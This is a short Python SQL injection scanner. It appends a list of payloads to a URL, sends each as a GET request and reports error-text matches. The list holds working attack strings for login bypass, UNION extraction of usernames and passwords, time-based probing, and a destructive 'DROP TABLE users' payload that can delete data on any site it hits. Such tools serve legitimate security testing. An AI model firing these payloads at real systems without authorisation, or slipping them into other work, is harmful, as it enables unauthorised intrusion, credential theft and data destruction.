import requests

def scan_sql_injection(url):
    sql_payloads = [
        "' OR '1'='1",                # Bypass authentication
        "' UNION SELECT NULL--",       # Extract data
        "' OR 'a'='a",                 # Simple injection
        "' OR 1=1 --",                 # Common payload
        "' UNION SELECT ALL TABLES",   # Extract table info
        "' OR '1'='1' --",             # Injection for login forms
        "1' AND 1=1--",                # Boolean-based injection
        "'; DROP TABLE users--",       # Table deletion
        "' AND SLEEP(5)--",            # Time-based injection
        "' UNION SELECT username, password FROM users--",  # Extract login data
    ]
    
    results = []
    
    for payload in sql_payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if "SQL" in response.text or "syntax error" in response.text:
                results.append(f"SQL Injection Vulnerability Found: {test_url}")
        except requests.exceptions.RequestException as e:
            results.append(f"Error scanning {url}: {str(e)}")
    
    if not results:
        return "No SQL Injection vulnerabilities found."
    
    return results
